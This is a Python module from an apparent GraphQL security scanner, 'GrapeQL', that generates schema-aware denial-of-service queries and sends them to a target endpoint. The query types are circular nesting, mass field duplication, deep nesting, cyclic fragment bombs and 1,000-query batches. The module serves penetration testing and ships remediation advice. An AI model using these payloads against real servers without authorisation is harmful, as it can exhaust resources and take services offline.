"""
GrapeQL DoS Tester
Author: Aleksa Zatezalo
Version: 2.0
Date: April 2025
Description: Tests GraphQL endpoints for Denial of Service vulnerabilities
"""

import asyncio
import time
from typing import Dict, List, Optional, Tuple, Any
from .tester import VulnerabilityTester
from .utils import Finding

class DosTester(VulnerabilityTester):
    """
    Tests GraphQL endpoints for various Denial of Service vulnerabilities by
    generating schema-aware queries designed to stress server resources.
    """
    
    def __init__(self):
        """Initialize the DoS tester."""
        super().__init__()
        self.test_name = "GraphQL DoS Testing"
        self.types = {}
        self.query_type = None
        
    async def setup_endpoint(self, endpoint: str, proxy: Optional[str] = None) -> bool:
        """
        Set up the testing environment with the target endpoint.
        
        Args:
            endpoint: GraphQL endpoint URL
            proxy: Optional proxy in host:port format
            
        Returns:
            bool: True if setup was successful
        """
        result = await super().setup_endpoint(endpoint, proxy)
        
        if result and self.client.schema:
            # Process schema into a more usable format for DoS testing
            self.query_type = self.client.schema.get("queryType", {}).get("name")
            
            # Process types from schema
            for type_info in self.client.schema.get("types", []):
                if type_info.get("fields"):
                    self.types[type_info.get("name")] = {
                        "fields": type_info.get("fields", [])
                    }
                    
        return result
        
    def generate_circular_query(self) -> str:
        """
        Generate a deeply nested circular query based on schema types that 
        reference each other, creating a complex recursive query pattern
        to test for DoS vulnerabilities.
        
        Returns:
            str: Circular query or empty string if not possible
        """
        if not self.types:
            return ""
            
        # Get all fields that reference other types
        circular_refs = []
        for type_name, type_info in self.types.items():
            for field in type_info.get("fields", []):
                field_type = field.get("type", {})
                target_type = field_type.get("name") or field_type.get("ofType", {}).get("name")
                
                if target_type in self.types:
                    circular_refs.append({
                        "type": type_name,
                        "field": field["name"],
                        "target": target_type
                    })
                    
        if not circular_refs:
            return ""
            
        # Pick first circular reference to start with
        base_ref = circular_refs[0]
        
        # Create deeply nested query
        nested_query = """
            id
            name 
            description
            createdAt
        """
        
        # Build up nested levels
        for _ in range(10):
            nested_query = f"""
            {base_ref['field']} {{
                id
                name
                description
                createdAt
                {nested_query}
                {base_ref['field']} {{
                    id
                    name
                    description 
                    {nested_query}
                }}
            }}
            """
            
        # Duplicate the entire query structure multiple times
        full_query = f"""
        query CircularQuery {{
            {nested_query}
            {nested_query}
            {nested_query}
        }}
        """
        
        return full_query
        
    def generate_field_duplication(self) -> str:
        """
        Generate a query with massively duplicated fields based on schema.
        
        Returns:
            str: Field duplication query or empty string if not possible
        """
        if not self.query_type or not self.types.get(self.query_type):
            return ""
            
        # Get all scalar fields from the query type
        scalar_fields = []
        for field in self.types[self.query_type].get("fields", []):
            field_type = field.get("type", {}).get("name")
            if field_type in ["String", "Int", "Float", "Boolean", "ID"]:
                scalar_fields.append(field["name"])
                
        if not scalar_fields:
            return ""
            
        # Duplicate the first scalar field many times
        duplicated_field = f"{scalar_fields[0]}\n" * 10000
        return f"query {{ {duplicated_field} }}"
        
    def generate_deeply_nested_query(self) -> str:
        """
        Generate a deeply nested query based on schema types.
        
        Returns:
            str: Deeply nested query or empty string if not possible
        """
        if not self.query_type or not self.types.get(self.query_type):
            return ""
            
        # Find a field that returns an object type
        object_fields = []
        for field in self.types[self.query_type].get("fields", []):
            field_type = field.get("type", {})
            target_type = field_type.get("name") or field_type.get("ofType", {}).get("name")
            
            if target_type in self.types:
                object_fields.append(field["name"])
                
        if not object_fields:
            return ""
            
        # Create deeply nested query
        nested_levels = 100
        current_query = "id"
        for _ in range(nested_levels):
            current_query = f"""
            {object_fields[0]} {{
                {current_query}
            }}
            """
            
        return f"query {{ {current_query} }}"
        
    def generate_array_batching(self) -> List[Dict[str, str]]:
        """
        Generate a batch of queries to be sent as a single request.
        
        Returns:
            List[Dict[str, str]]: Batch of query objects or empty list if not possible
        """
        if not self.query_type or not self.types.get(self.query_type):
            return []
            
        fields = self.types[self.query_type].get("fields", [])
        if not fields:
            return []
            
        # Get first available field
        first_field = fields[0]
        
        # Create batch of simple queries
        return [
            {
                "query": f"""
                query {{
                    {first_field["name"]} {{
                        id
                    }}
                }}
                """
            }
            for _ in range(1000)
        ]
        
    def generate_fragment_bomb(self) -> str:
        """
        Generate a query with many fragments that reference each other.
        
        Returns:
            str: Fragment bomb query or empty string if not possible
        """
        if not self.query_type or not self.types.get(self.query_type):
            return ""
            
        fragments = []
        fragment_spreads = []
        
        # Find types to use in fragments
        usable_types = []
        for type_name, type_info in self.types.items():
            if type_name != "Query" and type_name != "Mutation" and type_info.get("fields"):
                usable_types.append(type_name)
                
        if not usable_types:
            return ""
            
        # Create fragments that reference each other
        for i in range(min(50, len(usable_types))):
            type_name = usable_types[i % len(usable_types)]
            fragment_name = f"Frag{i}"
            next_fragment = f"Frag{(i + 1) % 50}"
            
            # Create a fragment that spreads the next fragment
            fragments.append(f"""
            fragment {fragment_name} on {type_name} {{
                ... on {type_name} {{
                    ...{next_fragment}
                }}
            }}
            """)
            
            fragment_spreads.append(f"...{fragment_name}")
            
        # Create a query that uses the fragments
        query = f"""
        query FragmentBomb {{
            {" ".join(fragment_spreads)}
        }}
        
        {" ".join(fragments)}
        """
        
        return query
        
    async def test_query(self, query: str, timeout: float = 10.0) -> Tuple[bool, float]:
        """
        Test a GraphQL query for DoS vulnerability.
        
        Args:
            query: The query to test
            timeout: Maximum time to wait for response
            
        Returns:
            Tuple[bool, float]: (is_vulnerable, response_time)
        """
        if not query:
            return False, 0.0
            
        start_time = time.time()
        try:
            response, error = await self.client.graphql_query(query)
            duration = time.time() - start_time
            
            # Consider it vulnerable if response time is excessive or server errors
            is_vulnerable = (
                duration > 5.0 or 
                (response and "errors" in response and any(
                    "timeout" in str(err.get("message", "")).lower() or
                    "memory" in str(err.get("message", "")).lower() or
                    "stack" in str(err.get("message", "")).lower()
                    for err in response.get("errors", [])
                ))
            )
            
            return is_vulnerable, duration
            
        except asyncio.TimeoutError:
            return True, timeout
        except Exception:
            # If the server crashed or connection failed, it may be vulnerable
            return True, time.time() - start_time
            
    async def run_test(self) -> List[Finding]:
        """
        Run all DoS tests and return findings.
        
        Returns:
            List[Finding]: All findings from the test
        """
        if not self.client.endpoint or not self.types:
            self.printer.print_msg(
                "No endpoint set or schema not retrieved. Run setup_endpoint first.",
                status="error"
            )
            return self.findings
            
        self.printer.print_section("Starting Denial of Service Testing")
        self.printer.print_msg(
            "Warning: The application may become unresponsive during testing.",
            status="warning"
        )
        
        # Define all the tests to run
        tests = [
            ("Circular Query DoS", self.generate_circular_query),
            ("Field Duplication DoS", self.generate_field_duplication),
            ("Deeply Nested Query DoS", self.generate_deeply_nested_query),
            ("Fragment Bomb DoS", self.generate_fragment_bomb)
        ]
        
        # Run each test
        for test_name, query_generator in tests:
            self.printer.print_msg(f"Testing for {test_name}...", status="log")
            
            # Generate the test query
            query = query_generator()
            if not query:
                self.printer.print_msg(
                    f"Skipping {test_name} - could not generate suitable query",
                    status="warning"
                )
                continue
                
            # Run the test
            is_vulnerable, duration = await self.test_query(query)
            
            # Report results
            if is_vulnerable:
                self.printer.print_msg(
                    f"Endpoint is VULNERABLE to {test_name}!",
                    status="failed"
                )
                self.printer.print_msg(
                    f"Response time: {duration:.2f} seconds",
                    status="failed"
                )
                
                # Add finding
                finding = Finding(
                    title=f"DoS Vulnerability: {test_name}",
                    severity="HIGH",
                    description=f"The GraphQL endpoint is vulnerable to denial of service through {test_name.lower()}. Response time: {duration:.2f} seconds.",
                    endpoint=self.client.endpoint,
                    impact="Server resources can be exhausted, potentially causing service outages",
                    remediation="Implement query depth limiting, timeout controls, and query cost analysis"
                )
                self.findings.append(finding)
                self.add_finding(finding)
            else:
                self.printer.print_msg(
                    f"Endpoint is NOT vulnerable to {test_name}",
                    status="success"
                )
                self.printer.print_msg(
                    f"Response time: {duration:.2f} seconds",
                    status="success"
                )
                
            # Add a delay between tests to let the server recover
            await asyncio.sleep(5)
            
        # Test batch query attack if supported
        self.printer.print_msg("Testing for Array Batching DoS...", status="log")
        batch_queries = self.generate_array_batching()
        
        if batch_queries:
            start_time = time.time()
            try:
                # Make request with batch of queries
                response, _ = await self.client.make_request(
                    "POST",
                    json=batch_queries
                )
                
                duration = time.time() - start_time
                is_vulnerable = duration > 5.0
                
                if is_vulnerable:
                    self.printer.print_msg(
                        "Endpoint is VULNERABLE to Array Batching DoS!",
                        status="failed"
                    )
                    self.printer.print_msg(
                        f"Response time: {duration:.2f} seconds",
                        status="failed"
                    )
                    
                    # Add finding
                    finding = Finding(
                        title="DoS Vulnerability: Array Batching Attack",
                        severity="HIGH",
                        description=f"The GraphQL endpoint is vulnerable to denial of service through array batching. Response time: {duration:.2f} seconds.",
                        endpoint=self.client.endpoint,
                        impact="Server resources can be exhausted by sending many queries in a single request",
                        remediation="Limit the number of operations allowed in a batch request"
                    )
                    self.findings.append(finding)
                    self.add_finding(finding)
                else:
                    self.printer.print_msg(
                        "Endpoint is NOT vulnerable to Array Batching DoS",
                        status="success"
                    )
                    self.printer.print_msg(
                        f"Response time: {duration:.2f} seconds",
                        status="success"
                    )
                    
            except Exception as e:
                self.printer.print_msg(
                    f"Error testing Array Batching: {str(e)}",
                    status="error"
                )
        else:
            self.printer.print_msg(
                "Skipping Array Batching test - could not generate suitable queries",
                status="warning"
            )
            
        return self.findings